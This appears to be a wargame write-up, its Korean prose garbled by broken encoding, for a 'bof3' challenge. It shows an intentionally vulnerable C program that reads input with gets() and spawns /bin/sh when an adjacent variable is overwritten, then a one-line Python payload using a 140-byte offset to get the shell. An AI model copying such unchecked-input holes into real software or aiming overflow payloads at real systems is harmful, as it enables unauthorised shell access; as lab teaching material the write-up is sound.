# bo3 ����

## bof3.c
``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define BUF_SIZE 128
#define KEY 0x61
#define G "\033[32m"
#define E "\033[0m"
#define Y "\033[33m"

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION OFF

void vuln() {
    int innocent;
    char buf[BUF_SIZE];

    puts(G "enter your name :)" E);
    gets(buf);
    printf("Hello " Y "%s" E "!\n", buf);

    if (innocent  == KEY) {
        if (setreuid(1003, 1003)) {
            perror("setuid");
            exit(1);
        }
        if (setregid(1003, 1003)) {
            perror("setgid");
            exit(1);
        }
        system("/bin/sh");
    }
}

int main(){
    vuln();
    return 0;
}
```

�� �ڵ忡�� ������� vuln �Լ� �ȿ� gets �Լ��̴�. gets �Լ��� ���� ���� ����, �Է��ѵ��� ���ÿ� �����Ѵ�.

## ���� ���

Buffer Overflow ����� ����� ���̴�.

�� �ڵ带 �� �� `innocent` ������ `KEY=0x61` ���� ���� ������ `/bin/sh` ����� �����Ų��. 

�츮�� `innocent` ������ ���ϴ� ���� ������ `/bin/sh` ����� �����ϵ��� �� ���̴�. 

���� �������� stack �� ���̰� �ȴ�. �������� �Ҵ�� ũ�Ⱑ �ִµ� �� ũ�⸦ �Ѿ �����ϰ� �Ǹ� �ٸ� �������� ������ �� �� �ְ� �ȴ�. �׷��� `buf` �� `innocent` ���̿� ũ�⸸ŭ �Է��� ������ ���� `innocent`�� ���ϴ� ���� �����ϰ� �ϴ� ���̴�.

## `innocent` �� `buf` ���� ũ�� ���ϱ�

������ ��� �ִ� �ּҰ��� ���� �� ���̸� ���Ѵ�.

![bof3 rdi](img/bof3%20rdi.png)


gets �Լ��� breakpoint �� �ɾ� rdi �������Ϳ� ����� ��, �� ���ڿ� ���� ����Ű�� �ּҸ� Ȯ���Ѵ�. 

![bof3 ino](img/bof3%20ino.png)

```c
if (innocent  == KEY) {
    ...
}
```
if ���� Ȯ���ϴ� ������ �̵��� `innocent`�� ����Ǿ� �ִ� �ּҰ��� Ȯ���Ѵ�. `rbp-0x4`�� �� �ּҰ��̴�.

![bof3 sub](img/sub.png)

�� �ּҰ��� ���̸� Ȯ���ϸ� 140�� ���� �� �� �ִ�.

![bof3 result](img/result.png)

�׷��� ������ ���� �Է��� �ϸ� `/bin/sh`�� ����� ���� �� �� �ִ�.
``` shell
(python -c 'print "a"*140+"a\x00\x00\x00"'; cat ) | ./bof3
```

`buf`�� 'a' ��� ������ ���� 140�� �Է������ν� �� ä��� �� ���� `KEY`�� �����ϰ� `innocent`�� �Է������� `innocent==KEY` �� �����ϰ� �Ѵ�. �� �ڿ� ������ `cat`�� shell�� �����ϰ� �� �� ���α׷��� ������ �ʰ� �ϱ� �����̴�.

